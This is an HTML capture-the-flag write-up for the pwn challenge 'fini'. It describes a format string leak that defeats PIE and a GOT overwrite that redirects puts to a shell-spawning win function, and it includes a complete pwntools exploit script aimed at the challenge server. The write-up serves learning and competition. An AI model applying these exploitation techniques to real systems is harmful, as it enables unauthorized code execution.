@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Writeup - fini Challenge</title>
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #e0e0e0;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #1a1a1a;
+        }
+
+        header {
+            background-color: #121212;
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            border-left: 4px solid #0d7377;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 2.2em;
+            color: #0d7377;
+        }
+
+        .challenge-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .challenge-info div {
+            background-color: #222;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+        }
+
+        .container {
+            background-color: #222;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #0d7377;
+            border-bottom: 2px solid #333;
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            color: #14ffec;
+            margin-top: 25px;
+        }
+
+        pre {
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 15px 0;
+            padding: 0;
+        }
+
+        code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-radius: 5px;
+        }
+
+        .description {
+            background-color: #2a2a2a;
+            border-left: 4px solid #0d7377;
+            padding: 10px 20px;
+            margin: 20px 0;
+        }
+
+        .flag {
+            background-color: #1c3b1c;
+            color: #00ff7f;
+            padding: 10px 20px;
+            border-left: 4px solid #00ff7f;
+            margin: 20px 0;
+            font-weight: bold;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        .step {
+            margin-bottom: 30px;
+        }
+
+        .step-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #14ffec;
+        }
+
+        ul {
+            padding-left: 20px;
+        }
+
+        ul li {
+            margin-bottom: 8px;
+        }
+
+        .references a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+
+        .references a:hover {
+            text-decoration: underline;
+            color: #0d7377;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #777;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #444;
+            border-radius: 4px;
+            padding: 5px;
+            margin: 10px 0;
+        }
+
+        .command {
+            background-color: #151515;
+            color: #14ffec;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-left: 4px solid #0d7377;
+        }
+
+        .output {
+            background-color: #1a1a1a;
+            padding: 10px 15px;
+            border-radius: 5px;
+            border-left: 4px solid #444;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            color: #ddd;
+        }
+
+        .highlight-section {
+            background-color: #1a1a1a;
+            border-left: 4px solid #14ffec;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .emoji {
+            font-size: 1.2em;
+            margin-right: 5px;
+        }
+
+        .key-point {
+            border-left: 3px solid #ff7e67;
+            padding-left: 15px;
+            margin: 15px 0;
+            background-color: rgba(255, 126, 103, 0.1);
+        }
+
+        .math {
+            background-color: #1a1a1a;
+            border: 1px solid #444;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        .time-info {
+            background-color: #2a1a1a;
+            border: 1px solid #664444;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .vulnerability-box {
+            background-color: #2a1a1a;
+            border: 2px solid #ff4444;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .success-box {
+            background-color: #1a2a1a;
+            border: 2px solid #44ff44;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        /* Custom Scrollbar */
+        *::-webkit-scrollbar {
+            width: 12px;
+            height: 12px;
+        }
+
+        *::-webkit-scrollbar-track {
+            background: #1a1a1a;
+            border-radius: 10px;
+            border: 1px solid #2a2a2a;
+        }
+
+        *::-webkit-scrollbar-thumb {
+            background: linear-gradient(135deg, #0d7377 0%, #14ffec 100%);
+            border-radius: 10px;
+            border: 2px solid #1a1a1a;
+        }
+
+        *::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(135deg, #14ffec 0%, #0d7377 100%);
+            box-shadow: 0 0 8px rgba(20, 255, 236, 0.6);
+        }
+
+        *::-webkit-scrollbar-corner {
+            background: #1a1a1a;
+        }
+
+        /* Firefox */
+        * {
+            scrollbar-width: thin;
+            scrollbar-color: #0d7377 #1a1a1a;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>🚀 Challenge: fini</h1>
+        <div class="challenge-info">
+            <div>🏆 CTF@AC</div>
+            <div>🎯 Category: Pwn</div>
+            <div>💯 Points: 100</div>
+            <div>📊 Solves: 46</div>
+            <div>👤 Author: thek0der</div>
+            <div>👤 Solver: IRVANNI/CuboConNoveQuadrati</div>
+        </div>
+    </header>
+
+    <div class="container">
+        <h2>📝 Challenge Description</h2>
+        <div class="description">
+            <p>"Hope you can FINIsh this challenge"</p>
+        </div>
+        <p><strong>📁 Files:</strong> challenge (ELF 64-bit LSB pie executable)</p>
+        <p><strong>🌐 Server:</strong> ctf.ac.upt.ro:9222</p>
+    </div>
+
+    <div class="container">
+        <h2>🔍 Initial Analysis</h2>
+        <p>When I first decompiled the challenge executable, I immediately noticed the program structure contained several interesting components that caught my attention:</p>
+
+        <div class="key-point">
+            <p>🎯 <strong>Key Observations:</strong></p>
+            <ul>
+                <li>📝 Initial name input functionality</li>
+                <li>🖨️ Direct printf usage with user input</li>
+                <li>✍️ A "write" feature allowing memory manipulation</li>
+                <li>🏆 A 'win' function that executes "/bin/sh"</li>
+                <li>🛡️ PIE (Position Independent Executable) protection enabled</li>
+            </ul>
+        </div>
+
+        <p>The most immediate red flag was the printf implementation. The program was taking user input and passing it directly to printf without a proper format string - a classic format string vulnerability!</p>
+
+        <div class="vulnerability-box">
+            <p>⚠️ <strong>Vulnerability Identified:</strong><br>
+            The program uses <code>printf(user_input)</code> instead of <code>printf("%s", user_input)</code>, making it vulnerable to format string attacks.</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>🛠️ Exploitation Strategy Development</h2>
+
+        <div class="step">
+            <h3>🔍 Step 1: Understanding the Attack Surface</h3>
+            <p>After analyzing the binary more thoroughly, I identified several key elements for my exploitation strategy:</p>
+            
+            <ul>
+                <li>🎯 <strong>Target:</strong> The 'win' function that spawns a shell</li>
+                <li>🔧 <strong>Tool:</strong> Format string vulnerability for information leakage</li>
+                <li>✍️ <strong>Weapon:</strong> Memory write capability via the "write" feature</li>
+                <li>🛡️ <strong>Obstacle:</strong> PIE making addresses unpredictable</li>
+            </ul>
+            
+            <p>The challenge was clear: I needed to somehow redirect execution flow to the 'win' function, but PIE meant I couldn't predict its address ahead of time.</p>
+        </div>
+
+        <div class="step">
+            <h3>🧠 Step 2: Tackling the PIE Problem</h3>
+            <p>My initial approach was ambitious but ultimately flawed:</p>
+            
+            <div class="highlight-section">
+                <p>💭 <strong>Original Plan (Failed):</strong></p>
+                <ul>
+                    <li>Use format string to leak win function address directly</li>
+                    <li>Also leak the saved RIP from the stack</li>
+                    <li>Overwrite saved RIP to point to win function</li>
+                </ul>
+            </div>
+            
+            <p>However, I quickly discovered that both the win function address and saved RIP were at offsets too high to reach with the format string vulnerability. I needed a different approach!</p>
+
+            <div class="key-point">
+                <p>💡 <strong>Breakthrough Insight:</strong><br>
+                Instead of trying to leak the win address directly, I could leak the main function address, calculate the base address, and then derive both win and any other needed addresses from there!</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <h3>📐 Step 3: Address Calculation Mathematics</h3>
+            <p>The beauty of PIE is that while addresses change, the relative offsets between functions remain constant. My calculation strategy:</p>
+
+            <div class="math">
+                leaked_main_addr = format_string_leak<br>
+                base_address = leaked_main_addr - main_offset<br>
+                win_address = base_address + win_offset<br>
+                target_address = base_address + target_offset
+            </div>
+
+            <p>This approach would allow me to calculate any needed runtime address once I had just one function's address!</p>
+        </div>
+
+        <div class="step">
+            <h3>🚨 Step 4: The Exit() Function Roadblock</h3>
+            <p>I initially planned to overwrite the saved RIP to redirect execution to the win function. However, when I tested locally, I encountered an unexpected issue:</p>
+            
+            <div class="vulnerability-box">
+                <p>🚫 <strong>Problem Discovered:</strong><br>
+                The program uses an "exit" feature that calls the exit() function, which modifies the saved RIP and terminates execution cleanly, bypassing my RIP overwrite!</p>
+            </div>
+            
+            <p>At this point, I was frustrated - "Nooo, I did all this work only to make a mistake at the very end???" But then I noticed something interesting in the program flow...</p>
+        </div>
+
+        <div class="step">
+            <h3>🎯 Step 5: The Puts() Function Pivot</h3>
+            <p>While debugging with gdb, I made a crucial observation:</p>
+            
+            <div class="success-box">
+                <p>💡 <strong>New Attack Vector:</strong><br>
+                After the "write" feature completes, the program calls puts("ok") to provide feedback. Instead of overwriting saved RIP, I could overwrite the puts function in the GOT with the win function address!</p>
+            </div>
+            
+            <p>This was perfect because:</p>
+            <ul>
+                <li>✅ The puts call happens after my memory write</li>
+                <li>✅ GOT entries are writable</li>
+                <li>✅ It bypasses the exit() function issue</li>
+                <li>✅ Guaranteed execution flow redirection</li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>🎯 Local vs Remote: The Offset Challenge</h2>
+
+        <div class="step">
+            <h3>🏠 Step 6: Local Success</h3>
+            <p>With my new strategy, I successfully gained shell access locally! The exploit worked perfectly:</p>
+            
+            <ol>
+                <li>Leak main address using format string</li>
+                <li>Calculate base address and derive win/puts addresses</li>
+                <li>Use write feature to overwrite puts GOT entry with win address</li>
+                <li>Trigger puts call → shell access! 🎉</li>
+            </ol>
+        </div>
+
+        <div class="step">
+            <h3>🌐 Step 7: Remote Reality Check</h3>
+            <p>Confident in my solution, I connected to the remote server expecting immediate success. Spoiler alert: it didn't work! 😅</p>
+            
+            <div class="key-point">
+                <p>🔍 <strong>The Problem:</strong><br>
+                The offset for the format string attack can vary between local and remote environments due to different system configurations, ASLR implementations, and stack layouts!</p>
+            </div>
+            
+            <p>After researching online, I discovered this is a common issue in CTF challenges. The solution? A controlled brute force approach to find the correct offset.</p>
+        </div>
+
+        <div class="step">
+            <h3>🎲 Step 8: Brute Force Success</h3>
+            <p>I implemented a systematic approach to find the correct offset:</p>
+            
+            <div class="math">
+                for offset in range(10, 41):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;try_exploit_with_offset(offset)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;if success: break
+            </div>
+            
+            <p>After testing various offsets between 10 and 40, I found that <strong>offset 31</strong> was the magic number for the remote environment! 🎊</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>🐍 Final Exploit Script</h2>
+
+        <pre><code class="language-python">from pwn import *
+
+HOST, PORT = "ctf.ac.upt.ro", 9222
+exe = context.binary = ELF("./challenge")
+
+def get_io():
+    if args.REMOTE:
+        return remote(HOST, PORT)
+    else:
+        return process("./challenge")
+
+io = get_io()
+
+# Leak main address to calculate base address
+io.sendlineafter(b"?\n", f"%31$p".encode())   # leak main_addr
+line = io.recvline(False).strip()
+leaked_main = int(line.split(b", ")[1], 16)
+base_addr = leaked_main - exe.sym['main']
+
+# Calculate real win and puts addresses
+win_addr = base_addr + exe.sym['win']
+puts_addr = base_addr + exe.got['puts']
+
+# log.info(f"puts_addr = {puts_addr:016x}")
+# log.info(f"win_address    = {win_addr:016x}")
+
+# Overwrite puts in win
+io.sendlineafter(b"> ", b"1")
+io.sendlineafter(b"Addr (hex): ", f"{puts_addr:016x}".encode())
+io.sendlineafter(b"Value (hex, 8 bytes): ", f"{win_addr:016x}".encode())
+
+io.sendline(b"cat flag.txt")
+ 
+flag = io.read().decode()
+
+io.close()
+
+print("Flag:", flag)</code></pre>
+
+        <div class="step">
+            <h3>📋 Script Breakdown</h3>
+            <p>🔧 <strong>How the exploit works:</strong></p>
+            <ol>
+                <li><strong>Setup:</strong> Connect to the challenge and load the binary</li>
+                <li><strong>Format String Attack:</strong> Use <code>%31$p</code> to leak main function address</li>
+                <li><strong>Address Calculation:</strong> Calculate base address and derive win/puts addresses</li>
+                <li><strong>GOT Overwrite:</strong> Use the write feature to overwrite puts GOT entry</li>
+                <li><strong>Shell Access:</strong> Trigger puts call which now points to win function</li>
+                <li><strong>Flag Retrieval:</strong> Execute <code>cat flag.txt</code> to get the flag</li>
+            </ol>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>🏆 Flag and Victory</h2>
+        <div class="flag">
+            🚩 ctf{ciao}
+        </div>
+        
+        <p>After all the challenges with PIE, format string offsets, and the exit() function redirect, successfully gaining remote shell access and retrieving the flag felt incredibly rewarding! 🎉</p>
+    </div>
+
+    <div class="container">
+        <h2>🎯 Key Takeaways</h2>
+        <ul>
+            <li>🔍 <strong>Format String Mastery:</strong> Understanding how to leak specific memory locations</li>
+            <li>🧮 <strong>PIE Bypass Techniques:</strong> Using relative offsets for address calculation</li>
+            <li>🎯 <strong>GOT Overwrite Strategy:</strong> Alternative to saved RIP manipulation</li>
+            <li>🔄 <strong>Local vs Remote Differences:</strong> Environment variations require adaptation</li>
+            <li>🎲 <strong>Controlled Brute Force:</strong> Systematic approach to finding correct offsets</li>
+            <li>🐛 <strong>Dynamic Debugging:</strong> Using gdb to understand program flow</li>
+            <li>🧠 <strong>Pivot Strategy:</strong> Adapting when initial approaches fail</li>
+        </ul>
+    </div>
+
+    <div class="container">
+        <h2>🔧 Technical Deep Dive</h2>
+        <h3>Format String Vulnerability Mechanics</h3>
+        <p>The format string vulnerability occurs when user input is passed directly as the format string to printf:</p>
+        
+        <div class="vulnerability-box">
+            <p><strong>Vulnerable:</strong> <code>printf(user_input);</code><br>
+            <strong>Safe:</strong> <code>printf("%s", user_input);</code></p>
+        </div>
+        
+        <h3>PIE (Position Independent Executable)</h3>
+        <p>PIE is a security feature that randomizes the base address of the executable, making it harder for attackers to predict function addresses. However, the relative offsets between functions remain constant.</p>
+        
+        <h3>GOT (Global Offset Table)</h3>
+        <p>The GOT contains addresses of external functions. By overwriting GOT entries, we can redirect function calls to arbitrary addresses - in this case, redirecting puts() to our win() function.</p>
+        
+        <div class="math">
+            Memory Layout:<br>
+            [GOT] puts@got → original_puts_address<br>
+            [After exploit] puts@got → win_function_address
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>🏆 © 2025 - Writeup created by IRVANNI/CuboConNoveQuadrati | Happy hacking! 🚀</p>
+    </div>
+</body>
+
+</html>
